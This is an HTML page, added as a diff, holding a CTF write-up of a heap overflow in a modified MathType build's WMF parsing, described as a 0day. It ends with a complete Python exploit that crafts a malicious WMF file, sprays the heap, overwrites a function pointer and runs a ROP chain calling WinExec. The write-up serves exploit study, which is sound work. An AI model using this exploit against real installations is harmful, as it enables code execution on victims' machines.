@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+    <title>MTP Writeup (0day) | r3kapig</title>
+    <meta property="og:title" content="r3kapig writeup" />
+    <meta property="og:locale" content="en_US" />
+    <meta name="description" content="Writeup for MTP Writeup (0day)" />
+    <meta property="og:description" content="Writeup for MTP Writeup (0day)" />
+    <link rel="canonical" href="https://r3kapig.com/writeup/" />
+    <meta property="og:url" content="https://r3kapig.com/writeup/" />
+    <meta property="og:site_name" content="r3kapig" />
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      min-height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      min-height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="../">
+        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">r3kapig / writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                writeup
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#reversing">reversing</a>
+    
+                <a class="dropdown-item" href="#wmf-format">wmf-format</a>
+    
+                <a class="dropdown-item" href="#construction-and-exploitation">construction-and-exploitation</a>
+    
+                <a class="dropdown-item" href="#full-exploit-code">full-exploit-code</a>
+    
+                <a class="dropdown-item" href="#final-words">final-words</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="order-3 dual-collapse2"> <!-- navbar-collapse w100 collapse -->
+        <ul class="navbar-nav ml-auto" style="flex-direction: row;">
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">writeup</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#reversing" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">reversing</span>
+            </a>
+    
+<a href="#wmf-format" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">wmf-format</span>
+            </a>
+    
+<a href="#construction-and-exploitation" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">construction-and-exploitation</span>
+            </a>
+    
+<a href="#full-exploit-code" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">full-exploit-code</span>
+            </a>
+    
+<a href="#final-words" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">final-words</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="mtp-writeup-0day"><a class="header-link" href="#mtp-writeup-0day"></a>MTP Writeup (0day)</h1>
+<p>Last week I solved an interesting challenge, which is actually a 0day bug.  </p>
+<p>We were given a software called <a href="https://www.dessci.com/en/products/mathtype/">MathType</a>, and we need to pop a calc by using a wmf file with the modified version of this software.</p>
+<p>It also said it is an unpatched heap overflow bug, so let&#39;s begin!</p>
+<h2 id="writeup"><a class="header-link" href="#writeup"></a>Writeup</h2>
+<h3 id="reversing"><a class="header-link" href="#reversing"></a>Reversing</h3>
+<p>The first thought after I saw the challenge description was we need a fuzzing, but I wanna reverse and locate the code processing wmf file.</p>
+<p>Simply generating a wmf file by File-&gt;Save menu, attach with your debugger and put a breakpoint at <strong>CreateFileW</strong>(I believe they don&#39;t use some hack trick like NtCreateFile or direct syscall). </p>
+<p>Now load the file you just saved, breakpoint triggered immediately.</p>
+<p>Btw, They <em><strong>removed</strong></em> ASLR in patched version of MathType.</p>
+<p class="img-container"><img src="img/1.jpg" alt="CreateFile"></p>
+<p>But where is the code that actually process WMF file? Now put a breakpoint at <em><strong>ReadFile</strong></em>.</p>
+<p>Here is the stack trace when we hit ReadFile.</p>
+<p class="img-container"><img src="img/2.jpg" alt="ReadFile"></p>
+<p>Now we inspect the code at 0x004555AC , as below.</p>
+<p class="img-container"><img src="img/3.jpg" alt=""></p>
+<p class="img-container"><img src="img/4.jpg" alt=""></p>
+<p class="img-container"><img src="img/5.jpg" alt=""></p>
+<p>Let&#39;s dig deeper and see what this proc does.</p>
+<p class="img-container"><img src="img/6.jpg" alt=""></p>
+<p>Well, we don&#39;t need to fuzz anymore :).</p>
+<h3 id="wmf-format"><a class="header-link" href="#wmf-format"></a>WMF format</h3>
+<p>So what the heck is wmf? </p>
+<blockquote>
+<p><strong>Windows Metafile</strong>(<strong>WMF</strong>) is an <a href="https://en.wikipedia.org/wiki/Image_file_format">image file format</a> originally designed for <a href="https://en.wikipedia.org/wiki/Microsoft_Windows">Microsoft Windows</a> in the 1990s. Windows Metafiles are intended to be portable between applications and may contain both <a href="https://en.wikipedia.org/wiki/Vector_graphics">vector graphics</a> and <a href="https://en.wikipedia.org/wiki/Bitmap">bitmap</a> components. It acts in a similar manner to <a href="https://en.wikipedia.org/wiki/SVG">SVG</a> files.</p>
+</blockquote>
+<p>MSDN also offers the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/4813e7fd-52d0-4f42-965f-228c8b7488d2">specification</a> for wmf file.</p>
+<p>Thank god someone wrote a parser in 010editor. Which really helps us for understanding WMF file.</p>
+<p>We can see the structure of WMF file is relatively simple.</p>
+<p class="img-container"><img src="img/7.jpg" alt=""></p>
+<p>A special header and a normal header, records follows after.</p>
+<p>Wait WTF is that checksum? How we compute it?</p>
+<p class="img-container"><img src="img/8.jpg" alt=""></p>
+<p>OK, seems a very simple checksum algorithm. Simply xor each byte.</p>
+<h3 id="construction-and-exploitation"><a class="header-link" href="#construction-and-exploitation"></a>Construction and Exploitation</h3>
+<p>Now we saw an unlimited heap overflow bug by reversing program, but how to trigger it?</p>
+<p>Let&#39;s review the code.</p>
+<p class="img-container"><img src="img/6.jpg" alt=""></p>
+<p>I bet u know nothing about what the heck is 1574 record function and what is 15 escape function. :)</p>
+<p>Let&#39;s seek our answer in <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/cfc88064-d86d-4b52-9374-3ce27d456179">MSDN</a>.</p>
+<p>1574 is actually 0x626 in hex which represents an ESCAPE record, and function 15 refers a META_ESCAPE_ENHANCED_METAFILE record.</p>
+<blockquote>
+<p>The <strong>META_ESCAPE_ENHANCED_METAFILE Record</strong> is used to embed an <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/bd05c35c-3eb1-49cc-90df-651b1f73f15a#gt_d9d0bff9-d270-4528-9081-fe51db809c36">EMF</a> <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/bd05c35c-3eb1-49cc-90df-651b1f73f15a#gt_ae5f028e-7e28-4a0b-bec6-2c87913f7db7">metafile</a> within a <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/bd05c35c-3eb1-49cc-90df-651b1f73f15a#gt_48849cf6-d55c-47e5-b041-13b65854de2b">WMF</a> metafile. The EMF metafile is broken up into sections, each represented by one <strong>META_ESCAPE_ENHANCED_METAFILE</strong>.</p>
+</blockquote>
+<p>Ah, we can embed some data in this record, clearly our program takes advantage of this feature and embed some of their custom structure inside.</p>
+<p>So what&#39;s the structure look like? Here&#39;s an example.</p>
+<p class="img-container"><img src="img/9.jpg" alt=""></p>
+<p>A bit of messy, never mind :)</p>
+<p>Now we know how to trigger the overflow, but what can we do with a simple heap overflow?</p>
+<p>They also added some code in patched version, let&#39;s see.</p>
+<p>I always check if the program is packed before reversing, and something interesting catches my eye.</p>
+<p class="img-container"><img src="img/10.jpg" alt=""></p>
+<p>Clearly they add some code in this section, let&#39;s see.</p>
+<p class="img-container"><img src="img/11.jpg" alt=""></p>
+<p>Hmm, a modified wmf process function.</p>
+<p class="img-container"><img src="img/12.jpg" alt=""></p>
+<p>They also added some interesting functions which I have no idea what they do.</p>
+<p class="img-container"><img src="img/13.jpg" alt=""></p>
+<p class="img-container"><img src="img/14.jpg" alt=""></p>
+<p>Also, there&#39;s new function that can arrange heap layout to what we want.</p>
+<p class="img-container"><img src="img/15.jpg" alt=""></p>
+<p>So ideally we allocate some buffer with 0x108 size to fill the heap hole, and allocate vuln buffer with META_ESCAPE_ENHANCED_METAFILE record, but don&#39;t trigger oob. Buffer contains function pointer should be allocated right after our vuln buffer. Next time we can oob the heap and overwrite the function pointer to achieve RCE.</p>
+<p class="img-container"><img src="img/16.jpg" alt=""></p>
+<p>By controlling eip, we can pivot the stack and do ROP, simply write a &quot;calc&quot; in data segment and call WinExec .</p>
+<p class="img-container"><img src="img/17.jpg" alt=""></p>
+<p class="img-container"><img src="img/18.jpg" alt=""></p>
+<h3 id="full-exploit-code"><a class="header-link" href="#full-exploit-code"></a>Full exploit code</h3>
+<pre class="hljs"><code><span class="hljs-comment"># -- coding:utf-8 --</span>
+<span class="hljs-comment"># Python3 required</span>
+<span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> base64
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">p32</span>(<span class="hljs-params">data</span>):</span>
+    <span class="hljs-keyword">return</span> pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, data)
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">p16</span>(<span class="hljs-params">data</span>):</span>
+    <span class="hljs-keyword">return</span> pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, data)
+
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Header</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>
+        self.key = <span class="hljs-number">0x9AC6CDD7</span>
+        self.HWmf = <span class="hljs-number">0</span>
+        self.left = self.top = self.right = self.bottom = self.inch = self.reserved = <span class="hljs-number">0</span>
+        self.<span class="hljs-built_in">type</span> = <span class="hljs-number">1</span>
+        self.HeaderSize = <span class="hljs-number">9</span>
+        self.version = <span class="hljs-number">0x300</span>
+        self.size = <span class="hljs-number">9</span>
+        self.NumberOfObjects = <span class="hljs-number">0</span>
+        self.MaxRecord = <span class="hljs-number">0x100</span>
+        self.NumberOfMembers = <span class="hljs-number">0</span>
+        self.Records = []
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__bytes__</span>(<span class="hljs-params">self</span>):</span>
+
+        self + Record()
+
+        s = pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, self.key)
+        s += pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, self.HWmf)
+        s += pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, self.left)
+        s += pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, self.top)
+        s += pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, self.right)
+        s += pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, self.bottom)
+        s += pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, self.inch)
+        s += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, self.reserved)
+        s += pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, self.checksum(s))
+
+        s += p16(self.<span class="hljs-built_in">type</span>)
+        s += p16(self.HeaderSize)
+        s += p16(self.version)
+        s += p32(self.size)
+        s += p16(self.NumberOfObjects)
+        s += p32(self.MaxRecord)
+        s += p16(self.NumberOfMembers)
+
+        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> self.Records:
+            s += <span class="hljs-built_in">bytes</span>(r)
+        <span class="hljs-keyword">return</span> s
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checksum</span>(<span class="hljs-params">self, s</span>):</span>
+        c = <span class="hljs-number">0</span>
+        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">len</span>(s) / <span class="hljs-number">2</span>)):
+            c ^= unpack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, s[<span class="hljs-number">2</span> * x:<span class="hljs-number">2</span> * x + <span class="hljs-number">2</span>])[<span class="hljs-number">0</span>]
+        <span class="hljs-keyword">return</span> c
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__add__</span>(<span class="hljs-params">self, other</span>):</span>
+        self.Records.append(other)
+        rs = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bytes</span>(other))
+        <span class="hljs-keyword">if</span> rs &gt; self.MaxRecord:
+            self.MaxRecord = rs
+        self.size += <span class="hljs-built_in">int</span>(rs / <span class="hljs-number">2</span>)
+        <span class="hljs-keyword">return</span> self
+
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Record</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>
+        self.RecordFunction = <span class="hljs-number">0</span>
+        self.RecordSize = <span class="hljs-number">3</span>
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__bytes__</span>(<span class="hljs-params">self</span>):</span>
+        s = p32(self.RecordSize)
+        s += p16(self.RecordFunction)
+        <span class="hljs-keyword">return</span> s
+
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PWNRecord</span>(<span class="hljs-params">Record</span>):</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, size, buf=<span class="hljs-literal">None</span></span>):</span>
+        <span class="hljs-built_in">super</span>(PWNRecord, self).__init__()
+        self.RecordFunction = <span class="hljs-number">0x2019</span>
+        self.size = size
+        self.buf = buf
+        <span class="hljs-keyword">if</span> self.buf:
+            length = <span class="hljs-built_in">len</span>(buf)
+            <span class="hljs-keyword">if</span> length &amp; <span class="hljs-number">1</span>:
+                length += <span class="hljs-number">1</span>
+                buf += <span class="hljs-string">&#x27;\x00&#x27;</span>.encode()
+            self.RecordSize += <span class="hljs-number">4</span> + <span class="hljs-built_in">int</span>(length / <span class="hljs-number">2</span>)
+        <span class="hljs-keyword">else</span>:
+            self.RecordSize += <span class="hljs-number">6</span>
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__bytes__</span>(<span class="hljs-params">self</span>):</span>
+        s = <span class="hljs-built_in">super</span>(PWNRecord, self).__bytes__()
+        s += p32(<span class="hljs-number">0x233</span>)
+        s += p32(self.size)
+        <span class="hljs-keyword">if</span> self.buf:
+            s += self.buf
+        <span class="hljs-keyword">else</span>:
+            s += p32(<span class="hljs-number">0</span>)
+        <span class="hljs-keyword">return</span> s
+
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EMFRecord</span>(<span class="hljs-params">Record</span>):</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, data</span>):</span>
+        <span class="hljs-built_in">super</span>(EMFRecord, self).__init__()
+        self.RecordFunction = <span class="hljs-number">1574</span>
+
+        self.efun = <span class="hljs-number">0</span>
+        self.bytecount = <span class="hljs-number">0</span>
+        self.CommentIdentifier = <span class="hljs-string">&#x27;AppsMFCC&#x27;</span>.encode()
+
+        self.RecordSize += <span class="hljs-number">11</span>
+        length = <span class="hljs-built_in">len</span>(data)
+        <span class="hljs-keyword">if</span> length &amp; <span class="hljs-number">1</span>:
+            data += <span class="hljs-string">&#x27;\x00&#x27;</span>.encode()
+            length += <span class="hljs-number">1</span>
+
+        self.RecordSize += <span class="hljs-built_in">int</span>(length / <span class="hljs-number">2</span>)
+        self.alloc_size = <span class="hljs-number">0</span>
+        self.buff_size = <span class="hljs-number">0</span>
+        self.version = <span class="hljs-number">1</span>
+        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(data, <span class="hljs-built_in">str</span>):
+            self.data = data.encode()
+        <span class="hljs-keyword">else</span>:
+            self.data = data
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__bytes__</span>(<span class="hljs-params">self</span>):</span>
+        s = <span class="hljs-built_in">super</span>(EMFRecord, self).__bytes__()
+        s += p16(self.efun)
+        s += p16(self.bytecount)
+        s += self.CommentIdentifier
+        s += p16(self.version)
+        s += p32(self.alloc_size)
+        s += p32(self.buff_size)
+        s += self.data
+        <span class="hljs-keyword">return</span> s
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    h = Header()
+    h.right = <span class="hljs-number">7168</span>
+    h.bottom = <span class="hljs-number">512</span>
+    h.inch = <span class="hljs-number">2304</span>
+    h + PWNRecord(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;cmd.exe\x00&#x27;</span>.encode())
+    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):
+        h + PWNRecord(<span class="hljs-number">0x108</span>)
+
+    payload = <span class="hljs-string">&#x27;Design Science, Inc.\x00&#x27;</span>.encode()
+    <span class="hljs-comment"># original data from test</span>
+    payload += base64.b64decode(<span class="hljs-string">&#x27;&#x27;&#x27;BQEABwREU01UNwAAE1dpbkFsbEJhc2ljQ29kZVBhZ2VzABEFVGltZXMgTmV3IFJv
+bWFuABEDU3ltYm9sABEFQ291cmllciBOZXcAEQRNVCBFeHRyYQATV2luQU5TSQAR
+BlRlYW1WaWV3ZXIxMwASAAghL0WPRC9BUPQQD0dfQVDyHx5BUPQVD0EA9EX0JfSP
+Ql9BAPQQD0NfQQD0j0X0Kl9I9I9BAPQQD0D0j0F/SPQQD0EqX0RfRfRfRfRfQQ8M
+AQABAAECAgICAAIAAQEBAAMAAQAEAAUACgAA
+&#x27;&#x27;&#x27;</span>)
+
+    e = EMFRecord(payload)
+    e.efun = <span class="hljs-number">0xf</span>
+    e.bytecount = <span class="hljs-number">0xff</span>
+    e.alloc_size = <span class="hljs-number">0x108</span>
+    e.buff_size = <span class="hljs-number">0xda</span>
+
+    h + e
+
+    payload = <span class="hljs-string">&#x27;Design Science, Inc.\x00&#x27;</span>
+    payload += <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x3e</span>
+
+    payload = payload.encode()
+
+    payload += p32(<span class="hljs-number">0x00753053</span>)  <span class="hljs-comment"># gadget 1 0x00753053: pop esi ; pop esp ; pop ebp ; ret  ;  (6 found)</span>
+    payload += p32(<span class="hljs-number">0x0043b056</span>)  <span class="hljs-comment"># 0x0043b056: add esp, 0x18 ; ret  ;  (2 found)</span>
+    payload += <span class="hljs-string">&#x27;Design Science, Inc.\x00\x00\x00\x00&#x27;</span>.encode()
+
+    <span class="hljs-comment"># 0x004f086e: pop eax ; ret  ;  (51 found)</span>
+    <span class="hljs-comment"># 0x004f0e9c: mov dword [ecx], eax ; ret</span>
+    <span class="hljs-comment"># 0x0040359f: pop ecx ; ret  ;  (934 found)</span>
+
+    payload += p32(<span class="hljs-number">0x004f086e</span>)
+    payload += p32(<span class="hljs-number">0x636c6163</span>)
+    payload += p32(<span class="hljs-number">0x0040359f</span>)
+    payload += p32(<span class="hljs-number">0x00619FC0</span>)
+    payload += p32(<span class="hljs-number">0x004f0e9c</span>)
+
+    payload += p32(<span class="hljs-number">0x04EDB7E</span>)  <span class="hljs-comment"># WinExec</span>
+    payload += p32(<span class="hljs-number">0x583190</span>)  <span class="hljs-comment"># ExitProcess</span>
+    payload += p32(<span class="hljs-number">0x00619FC0</span>)
+    payload += p32(<span class="hljs-number">5</span>)
+
+    e = EMFRecord(payload)
+    e.efun = <span class="hljs-number">0xf</span>
+    e.bytecount = <span class="hljs-number">0x100</span>
+    e.alloc_size = <span class="hljs-number">0x108</span>  <span class="hljs-comment"># it doesn&#x27;t matter</span>
+    e.buff_size = <span class="hljs-built_in">len</span>(payload)  <span class="hljs-comment"># oob</span>
+
+    h + e
+
+    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp.wmf&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:
+        f.write(<span class="hljs-built_in">bytes</span>(h))</code></pre><h3 id="final-words"><a class="header-link" href="#final-words"></a>Final words</h3>
+<p>Thanks for organizer! Such an interesting challenge!. Btw heap manipulation works the way that I don&#39;t think it works :).</p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
+<!--
+    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
+    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
+    Respective Copyrights apply.
+ -->
